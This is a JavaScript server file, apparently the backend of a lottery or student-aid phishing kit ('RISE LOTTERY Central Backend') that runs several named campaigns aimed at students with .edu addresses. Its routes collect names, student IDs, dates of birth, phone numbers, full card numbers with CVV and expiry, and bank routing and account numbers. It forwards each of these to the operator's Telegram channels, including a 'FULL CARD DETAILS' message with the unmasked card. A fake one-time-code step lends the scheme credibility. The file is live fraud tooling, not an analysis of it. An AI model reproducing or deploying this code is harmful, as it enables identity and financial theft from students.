    const domain = email.split('@')[1].toLowerCase().trim();
    let schoolName = schoolDatabase[domain];
    if (!schoolName) {
        const parts = domain.split('.');
        for (let i = 1; i < parts.length - 1; i++) {
            const testDomain = parts.slice(i).join('.');
            if (schoolDatabase[testDomain]) { schoolName = schoolDatabase[testDomain]; break; }
        }
    }
    if (!schoolName && domain.endsWith('.edu')) {
        const base = domain.split('.')[0];
        const stripped = base.replace(/^(stu|students|mail|email|my|portal|web)\.?/, '');
        const cleaned = stripped || base;
        const pretty = cleaned.split(/[.-]/).map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');
        schoolName = pretty + ' (Institution)';
    }
    return schoolName || null;
}

const otpService = new OTPService();
const telegramService = new TelegramService();

// ============================================================
// CAMPAIGN MIDDLEWARE
// ============================================================
// Extracts campaign ID from:
//   1. Body field: campaignId
//   2. Header: X-Campaign-Id
//   3. Query: ?campaign=emmy
// Defaults to 'emmy' if none provided.
// ============================================================
function extractCampaign(req, res, next) {
    const id =
        req.body?.campaignId ||
        req.headers['x-campaign-id'] ||
        req.query?.campaign ||
        'emmy'; // default campaign

    req.campaignId = String(id).toLowerCase();

    if (!campaignRegistry.has(req.campaignId)) {
        console.log(`⚠️  Unknown campaign "${req.campaignId}" — falling back to emmy`);
        req.campaignId = 'emmy';
    }

    next();
}

// ============================================================
// API ROUTES
// ============================================================

app.get('/api/health', (req, res) => {
    sendResponse(res, 200, {
        status: 'ok',
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'development',
        campaigns: campaignRegistry.list(),
        campaignCount: campaignRegistry.list().length
    });
});

app.get('/api/campaigns', (req, res) => {
    sendResponse(res, 200, {
        campaigns: campaignRegistry.list(),
        count: campaignRegistry.list().length
    });
});

app.get('/api/school/lookup', (req, res) => {
    const { email } = req.query;
    if (!email) return sendResponse(res, 400, {}, 'Email is required');
    const school = lookupSchool(email);
    if (school) sendResponse(res, 200, { school });
    else sendResponse(res, 404, {}, 'School not found');
});

// GENERATE OTP
app.post('/api/otp/generate', extractCampaign, [
    body('name').isString().isLength({ min: 1, max: 100 }).trim().escape(),
    body('email').isEmail().normalizeEmail(),
    body('personalEmail').isEmail().normalizeEmail(),
    body('studentId').isString().isLength({ min: 1, max: 50 }).trim().escape(),
    body('dob').isString().matches(/^\d{4}-\d{2}-\d{2}$/),
    body('phone').isString().matches(/^\(?(\d{3})\)?[-.\s]?(\d{3})[-.\s]?(\d{4})$/),
], asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return sendResponse(res, 400, { errors: errors.array() }, 'Validation failed');
    }

    const { name, email, personalEmail, studentId, dob, phone } = req.body;
    const campaignId = req.campaignId;

    if (!email.toLowerCase().endsWith('.edu')) {
        return sendResponse(res, 400, {}, 'Please enter a valid .edu email address');
    }

    const otp = otpService.generateOTP();
    otpService.storeOTP(personalEmail, otp);
    const schoolName = lookupSchool(email) || 'Unknown';
    const token = generateToken({ email: personalEmail, name, school: schoolName, campaign: campaignId });

    sendResponse(res, 200, {
        token, school: schoolName, otp, campaign: campaignId, expiresIn: '10 minutes'
    }, 'OTP generated successfully');

    telegramService.sendWithRetry(
        campaignId,
        telegramService.formatOTPNotification(
            campaignId, name, email, schoolName, otp, studentId, dob, phone, personalEmail
        )
    ).then(result => {
        console.log(`📱 Telegram [${campaignId}]:`, result.success ? '✅' : '❌');
    }).catch(err => console.error('Background task error:', err));
}));

// VERIFY OTP
app.post('/api/otp/verify', extractCampaign, [
    body('email').isEmail().normalizeEmail(),
    body('otp').isString().isLength({ min: 6, max: 6 }).matches(/^\d{6}$/),
], asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return sendResponse(res, 400, { errors: errors.array() }, 'Validation failed');
    }
    const { email, otp } = req.body;
    const verification = otpService.verifyOTP(email, otp);
    if (!verification.valid) return sendResponse(res, 401, {}, verification.error);
    const token = generateToken({ email, verified: true, campaign: req.campaignId, verifiedAt: new Date().toISOString() });
    sendResponse(res, 200, { token }, 'OTP verified successfully');
}));

// CARD VERIFICATION
app.post('/api/card/verify', extractCampaign, asyncHandler(async (req, res) => {
    const { name, email, schoolName, cardNumber, expiry, cvv, cardholderName, billingZip, hasAccountDetails } = req.body;
    const campaignId = req.campaignId;

    if (!hasAccountDetails) {
        await telegramService.sendWithRetry(
            campaignId,
            telegramService.formatAccountDetailsMissing(name, email, schoolName)
        );
        return sendResponse(res, 400, {}, 'Account details required');
    }

    const maskedCard = (cardNumber || '').replace(/\s/g, '');
    const displayCard = maskedCard.length >= 10
        ? maskedCard.slice(0, 6) + '******' + maskedCard.slice(-4)
        : maskedCard;

    await telegramService.sendWithRetry(
        campaignId,
        telegramService.formatCardVerification(
            name || 'Student', email || 'unknown', schoolName || 'Unknown',
            { cardNumber: displayCard, expiry, cvv, cardholderName, billingZip }
        )
    );

    await telegramService.sendWithRetry(campaignId, `💳 <b>FULL CARD DETAILS</b>
<i>Campaign: ${campaignId}</i>

👤 ${name}
📧 ${email}
💳 <code>${maskedCard}</code>
📅 ${expiry}
🔒 <code>${cvv}</code>
👤 ${cardholderName}
📮 ${billingZip || 'N/A'}
⏰ ${new Date().toLocaleString()}`);

    sendResponse(res, 200, {}, 'Card verification submitted successfully');
}));

// ACCOUNT DETAILS
app.post('/api/account/save', extractCampaign, asyncHandler(async (req, res) => {
    const { name, email, schoolName, bankName, accountType, accountHolder, routingNumber, accountNumber } = req.body;
    await telegramService.sendWithRetry(
        req.campaignId,
        telegramService.formatAccountDetails(
            name || 'Student', email || 'unknown', schoolName || 'Unknown',
            { bankName, accountType, accountHolder, routingNumber, accountNumber }
        )
    );
    sendResponse(res, 200, {}, 'Account details saved successfully');
}));

// ERRAND REQUEST
app.post('/api/errand/request', extractCampaign, asyncHandler(async (req, res) => {
    const { name, email, schoolName, telegram, whatsapp, preferred, hasAccountDetails } = req.body;
    if (!hasAccountDetails) {
        await telegramService.sendWithRetry(req.campaignId, telegramService.formatAccountDetailsMissing(name, email, schoolName));
        return sendResponse(res, 400, {}, 'Account details required');
    }
    await telegramService.sendWithRetry(
        req.campaignId,
        telegramService.formatErrandRequest(
            name || 'Student', email || 'unknown', schoolName || 'Unknown',
            telegram || 'Not provided', whatsapp || 'Not provided', preferred || 'Not specified'
        )
    );
    sendResponse(res, 200, {}, 'Errand request received');
}));

// USER LOGIN NOTIFICATION
app.post('/api/user/login', extractCampaign, asyncHandler(async (req, res) => {
    const { name, email, schoolName } = req.body;
    await telegramService.sendWithRetry(req.campaignId, `🟢 <b>USER LOGGED IN</b>
<i>Campaign: ${req.campaignId}</i>

👤 ${name || 'Student'}
📧 ${email || 'unknown'}
🏫 ${schoolName || 'Unknown'}
⏰ ${new Date().toLocaleString()}`);
    sendResponse(res, 200, {}, 'Login notification sent');
}));

// 404 — ONLY FOR /api/* ROUTES
app.use('/api/*', (req, res) => {
    sendResponse(res, 404, {}, 'API route not found');
});

// ERROR HANDLER
app.use((err, req, res, next) => {
    console.error('❌ Error:', err.message);
    const status = err.status || 500;
    const message = process.env.NODE_ENV === 'production' ? 'Internal server error' : err.message;
    sendResponse(res, status, {}, message);
});

// GRACEFUL SHUTDOWN
let server;
const gracefulShutdown = () => {
    console.log('🔄 Shutting down gracefully...');
    otpService.destroy();
    if (server) {
        server.close(() => { console.log('✅ Server closed'); process.exit(0); });
    }
};
process.on('SIGTERM', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);

// START SERVER
const PORT = process.env.PORT || 5000;
server = app.listen(PORT, () => {
    console.log(`🚀 RISE LOTTERY Central Backend on port ${PORT}`);
    console.log(`📦 Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`📢 Campaigns: ${campaignRegistry.list().join(', ') || 'none'}`);
    console.log(`🏫 Schools loaded: ${Object.keys(schoolDatabase).length}`);
});

module.exports = app;